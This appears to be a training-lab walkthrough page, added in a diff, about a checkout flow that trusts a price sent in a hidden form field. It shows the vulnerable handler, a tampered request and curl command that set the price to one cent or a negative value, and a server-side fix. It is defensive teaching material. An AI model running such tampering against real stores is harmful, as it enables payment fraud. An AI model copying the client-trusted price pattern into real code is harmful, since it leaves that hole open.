@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 5 Walkthrough</title>
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --panel: #11161d;
+      --text: #e5e7eb;
+      --muted: #a3acb9;
+      --line: #222a35;
+      --accent: #f59e0b;
+      --code-bg: #0f141b;
+      --code-text: #dbe4ee;
+      --kw: #c792ea;
+      --fn: #82aaff;
+      --str: #c3e88d;
+      --tag: #f78c6c;
+      --attr: #ffcb6b;
+      --var: #b0bec5;
+      --comment: #6b7280;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: Arial, Helvetica, sans-serif; padding: 32px 16px 48px; }
+    .page { max-width: 820px; margin: 0 auto; }
+    .article { background: var(--panel); border: 1px solid var(--line); border-radius: 10px; padding: 32px; }
+    .eyebrow { font-size: 0.78rem; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; color: var(--accent); margin-bottom: 14px; }
+    h1 { font-size: 2.2rem; line-height: 1.1; margin-bottom: 16px; font-weight: 700; }
+    .lead { font-size: 1rem; line-height: 1.7; color: var(--muted); margin-bottom: 32px; }
+    section + section { margin-top: 36px; padding-top: 28px; border-top: 1px solid var(--line); }
+    h2 { font-size: 1.35rem; margin-bottom: 14px; }
+    h3 { font-size: 0.98rem; margin: 22px 0 10px; color: var(--text); }
+    p { font-size: 0.98rem; line-height: 1.7; color: var(--muted); margin-bottom: 14px; }
+    pre { margin: 14px 0 18px; padding: 16px 18px; overflow-x: auto; background: var(--code-bg); color: var(--code-text); border: 1px solid var(--line); border-radius: 8px; font: 0.94rem/1.65 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    code.inline { font: 0.92em ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; background: #1b2330; color: var(--accent); padding: 2px 6px; border-radius: 6px; }
+    .callout { padding: 16px 18px; border-left: 4px solid var(--accent); background: #0f141b; margin: 14px 0 18px; color: var(--muted); }
+    .kw { color: var(--kw); } .fn { color: var(--fn); } .str { color: var(--str); } .tag { color: var(--tag); } .attr { color: var(--attr); } .var { color: var(--var); } .comment { color: var(--comment); }
+    strong { color: var(--text); }
+    @media (max-width: 820px) { body { padding: 20px 12px 40px; } .article { padding: 24px 20px; } h1 { font-size: 2rem; } }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <article class="article">
+      <div class="eyebrow">Day 3 / Lab 5</div>
+      <h1>Client-Controlled Price in a Checkout Flow</h1>
+      <p class="lead">The TechStore app shows a catalog with server-side prices, but the "Buy" form ships the price as a hidden field and the backend trusts it. Anyone who can edit the request can pay whatever they want.</p>
+
+      <section>
+        <h2>Quick reminder</h2>
+        <p>Anything that comes from the browser is attacker-controlled. Form fields, URL parameters, hidden inputs, JSON bodies — a hidden input is only hidden in the rendered page, not in the request. For anything that decides money, permissions, or state, the value must be looked up on the server from a trusted source.</p>
+      </section>
+
+      <section>
+        <h2>Where the vulnerability comes from</h2>
+        <p>The shop page renders each product with a form that includes the price as a hidden input.</p>
+        <pre><span class="tag">&lt;form</span> <span class="attr">method</span>=<span class="str">"post"</span> <span class="attr">action</span>=<span class="str">"/buy"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"product_name"</span> <span class="attr">value</span>=<span class="str">"Laptop Pro"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;input</span> <span class="attr">type</span>=<span class="str">"hidden"</span> <span class="attr">name</span>=<span class="str">"price"</span> <span class="attr">value</span>=<span class="str">"1299.99"</span><span class="tag">&gt;</span>
+  <span class="tag">&lt;button</span> <span class="attr">type</span>=<span class="str">"submit"</span><span class="tag">&gt;</span>Buy Now<span class="tag">&lt;/button&gt;</span>
+<span class="tag">&lt;/form&gt;</span></pre>
+
+        <p>The <code class="inline">/buy</code> handler parses the price from the form and deducts it directly from the user's balance.</p>
+        <pre><span class="kw">def</span> <span class="fn">buy</span>():
+    <span class="var">product_name</span> = request.form[<span class="str">'product_name'</span>]
+    <span class="var">price</span> = <span class="fn">float</span>(request.form[<span class="str">'price'</span>])
+
+    <span class="var">user</span> = conn.execute(<span class="str">"SELECT * FROM users WHERE username=?"</span>, (session[<span class="str">'username'</span>],)).fetchone()
+
+    <span class="kw">if</span> user[<span class="str">'balance'</span>] &lt; price:
+        <span class="kw">return</span> render_template(<span class="str">'shop.html'</span>, <span class="var">error</span>=<span class="str">'Insufficient balance!'</span>)
+
+    conn.execute(<span class="str">"UPDATE users SET balance = balance - ? WHERE username=?"</span>, (price, session[<span class="str">'username'</span>]))</pre>
+
+        <div class="callout">
+          <p>The product name also comes from the form and is saved to the orders table. That's another integrity issue — the order history doesn't line up with the real catalog — but the money bug is the one that matters.</p>
+        </div>
+      </section>
+
+      <section>
+        <h2>How the exploit works</h2>
+        <p>Start with a fresh account ($200 balance) and place one normal order so you see what the request looks like. Then replay the request with a modified price.</p>
+
+        <h3>The normal request</h3>
+        <pre>POST /buy
+Cookie: session=&lt;your-session&gt;
+
+product_name=Laptop+Pro&amp;price=1299.99</pre>
+
+        <h3>The tampered request</h3>
+        <pre>POST /buy
+Cookie: session=&lt;your-session&gt;
+
+product_name=Laptop+Pro&amp;price=0.01</pre>
+
+        <p>Any proxy works — Burp Repeater, the browser devtools "Edit and resend", or plain <code class="inline">curl</code>:</p>
+        <pre>curl -X POST http://localhost:5005/buy \
+  -H <span class="str">"Cookie: session=&lt;your-session&gt;"</span> \
+  -d <span class="str">"product_name=Laptop Pro&amp;price=0.01"</span></pre>
+
+        <p>The server deducts <code class="inline">0.01</code> and writes an order with that price. Visit <code class="inline">/orders</code> and the Laptop Pro shows up as paid for one cent.</p>
+
+        <h3>Going further</h3>
+        <p>A negative price credits the account. <code class="inline">price=-500</code> turns a "purchase" into a deposit, which is usually a clearer finding to demonstrate because the balance increases without any real payment.</p>
+      </section>
+
+      <section>
+        <h2>Fix</h2>
+        <p>Never take the price from the client. Keep a server-side catalog and look up the price by product id.</p>
+
+        <pre><span class="var">PRODUCTS</span> = {
+    <span class="str">1</span>: {<span class="str">'name'</span>: <span class="str">'USB Cable'</span>, <span class="str">'price'</span>: <span class="str">9.99</span>},
+    <span class="str">4</span>: {<span class="str">'name'</span>: <span class="str">'Gaming Monitor'</span>, <span class="str">'price'</span>: <span class="str">349.99</span>},
+    <span class="comment"># ...</span>
+}
+
+<span class="kw">def</span> <span class="fn">buy</span>():
+    <span class="var">product_id</span> = <span class="fn">int</span>(request.form[<span class="str">'product_id'</span>])
+    <span class="var">product</span> = PRODUCTS.get(product_id)
+    <span class="kw">if not</span> product:
+        <span class="kw">return</span> <span class="str">'Unknown product'</span>, <span class="str">400</span>
+
+    <span class="var">price</span> = product[<span class="str">'price'</span>]  <span class="comment"># trusted value</span>
+    <span class="var">name</span>  = product[<span class="str">'name'</span>]
+    <span class="comment"># ...then deduct price from the balance...</span></pre>
+
+        <p>The form only carries the product id. Everything that determines money is controlled by the server.</p>
+
+        <div class="callout">
+          <p>The same principle applies to anything sensitive: role, quantity limits, discount percentages, shipping country for tax. If the value decides anything that costs money or grants access, look it up — don't accept it from the client.</p>
+        </div>
+      </section>
+    </article>
+  </main>
+</body>
+</html>
